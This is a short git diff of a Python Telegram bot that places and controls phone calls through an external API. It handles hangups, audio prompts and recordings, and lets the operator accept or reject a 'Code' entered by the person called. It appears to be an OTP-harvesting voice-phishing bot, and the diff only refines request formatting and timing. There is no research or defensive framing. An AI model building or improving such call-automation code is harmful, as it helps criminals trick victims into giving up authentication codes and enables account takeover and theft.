@@ -783,8 +783,11 @@ def Set_custogrem_script(message):
 
 
 def callhangup(call_control:str):
-    hangurl = f'https://atlanta-api.online:8443/hangup?uuid={call_control}'
-    requests.post(hangurl)
+    hangurl = f'https://atlanta-api.online:8443/hangup'
+    payload = {
+         'uuid':call_control
+    }
+    requests.post(hangurl,json=payload)
 
    
 
@@ -905,12 +908,11 @@ def custom_confirm1(message):
 }
         requests.post(url, json=data)
         bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
-        time.sleep(4)
+        time.sleep(3)
         callhangup(call_control_id)
 
     elif up_resp1=='Deny':
         mes1=bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown').message_id
-        time.sleep(2)
         url = 'https://atlanta-api.online:8443/gather-audio'
         data = {
     "uuid": f"{call_control_id}",
@@ -968,7 +970,7 @@ def custom_prebuild_script_call(script_id,chatid):
 
     elif event == "call.hangup":
         try:
-            time.sleep(0.5)
+            time.sleep(0.7)
             resp = data['recording_url']
             response = requests.get(resp)
             payload = {
